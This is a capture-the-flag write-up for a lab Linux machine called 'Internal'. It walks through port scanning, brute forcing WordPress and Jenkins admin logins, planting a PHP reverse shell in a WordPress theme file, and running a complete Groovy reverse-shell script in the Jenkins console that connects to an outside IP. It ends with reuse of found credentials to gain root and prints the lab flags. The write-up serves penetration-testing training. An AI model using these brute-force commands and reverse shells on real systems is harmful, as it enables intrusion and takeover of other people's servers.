# Internal Writeup

> Machine : Linux

> Having accepted the project, you are provided with the client assessment environment.  Secure the User and Root flags and submit them to the dashboard as proof of exploitation.

## Solution

First we have to add the IP to the `hosts` file.

```shell
nano /etc/hosts
```

```text
127.0.0.1       localhost
127.0.1.1       kali
10.129.143.130  internal.thm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

Then reconnaissance and port scanning.

```shell
nmap -sV -sC -Pn --open internal.thm -p-
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:fa:ef:be:f6:5f:98:b9:59:7b:f7:8e:b9:c5:62:1e (RSA)
|   256 ed:64:ed:33:e5:c9:30:58:ba:23:04:0d:14:eb:30:e9 (ECDSA)
|_  256 b0:7f:7f:7b:52:62:62:2a:60:d4:3d:36:fa:89:ee:ff (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From our results, we can see two open ports, 22 (SSH) and 80 (HTTP).

Browsing `internal.thm` we found the Apache default page. Let's use `gobuster` to enumerate the hidden directories. 

```shell
gobuster dir -u http://internal.thm/ -w /usr/share/wordlists/dirb/common.txt -x php
```

```text
blog                 (Status: 301) [Size: 311] [--> http://internal.thm/blog/]
index.html           (Status: 200) [Size: 10918]
javascript           (Status: 301) [Size: 317] [--> http://internal.thm/javascript/]
phpmyadmin           (Status: 301) [Size: 317] [--> http://internal.thm/phpmyadmin/]
server-status        (Status: 403) [Size: 277]
wordpress            (Status: 301) [Size: 316] [--> http://internal.thm/wordpress/]
```

This is it we found a `wordpress` page.
I’ll use `WPScan` to enumerate users and gather information about the WordPress installation.

```shell
wpscan --url http://internal.thm/blog/ -e u
```

```text
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
 Brute Forcing Author IDs - Time: 00:00:00 <===============================================================================================================> (10 / 10) 100.00% Time: 00:00:00
[i] 1 user(s) Identified.
```

The user is `admin` that make it easy to brute force.

```shell
wpscan --url http://internal.thm/blog/wp-login.php -U admin -P /usr/share/wordlists/rockyou.txt
```

```text
[!] Valid Combinations Found:
| Username: admin, Password: my2boys
```

Now we have credentials to enter.

The best way is to upload a PHP reverse shell by modifying one of the theme files on:
`Appearance → Theme Editor → Twenty Seventeen Theme`

I select the `404.php` template file and replace its content with a PHP reverse shell. Using `revshells.com` can help.

First listening for connection.

```shell
nc -lnvp 6767
```

Then we have to enter `404.php` page to execute the reverse shell, which is:
`http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php`

And we are in.

```shell
id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```shell
ls -la /opt/
```

```text
drwxr-xr-x 3 root root 4096 Aug 3 2020 .  
drwxr-xr-x 24 root root 4096 Aug 3 2020 ..  
drwx--x--x 4 root root 4096 Aug 3 2020 containerd  
-rw-r--r-- 1 root root 138 Aug 3 2020 wp-save.txt
```

```shell
cat /opt/wp-save.txt
```

```text
Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123
```

Excellent! we found credentials for the user `aubreanna`.

```shell
su aubreanna
bubb13guM!@#123
```

```shell
ls /home/aubreanna
```

```text
jenkins.txt  snap  user.txt
```

```shell
cat /home/aubreanna/user.txt
```

```text
THM{int3rna1_fl4g_1}
```

> User.txt Flag
> 
> THM{int3rna1_fl4g_1}

```shell
cat /home/aubreanna/jenkins.txt 
```

```text
Internal Jenkins service is running on 172.17.0.2:8080
```

Since `Jenkins` is running on an internal Docker network, I need to forward the port to access it from my machine. 
I’ll use SSH local port forwarding.

```shell
ssh -L 8080:127.0.0.1:8080 aubreanna@internal.thm
bubb13guM!@#123
```

Now we can access Jenkins at `http://127.0.0.1:8080`.

We have a Jenkins login page. We know the the owner is using some basic users like admin so let's try guess the password.

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password" -f -vV
```

```text
[8080][http-post-form] host: 127.0.0.1   login: admin   password: spongebob
```

After entering Jenkins, now again we have to find a way to upload a reverse shell.

Entering `Script Console` we found a way to run `Groovy script`.
So again with using `revshells.com` you can find what you want.

First listening.

```shell
nc -lnvp 6969
```

Then run the Groovy reverse shell.

```groovy
String host="192.168.129.217";int port=6969;String cmd="sh";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

I receive a connection, but I’m inside the Docker container:

```shell
whoami
```

```text
jenkins
```

We need to find a way to escape the container or find root credentials.

After searching for interesting files we found:

```shell
cat /opt/note.txt
```

```text
Aubreanna,

Will wanted these credentials secured behind the Jenkins container since we have several layers of defense here.  Use them if you   
need access to the root user account.

root:tr0ub13guM!@#123
```

Now we can easily login as root.

```shell
ssh root@internal.thm  
tr0ub13guM!@#123
```

```shell
cat /root/root.txt 
```

```text
THM{d0ck3r_d3str0y3r}
```

> Root.txt Flag
> 
> THM{d0ck3r_d3str0y3r}

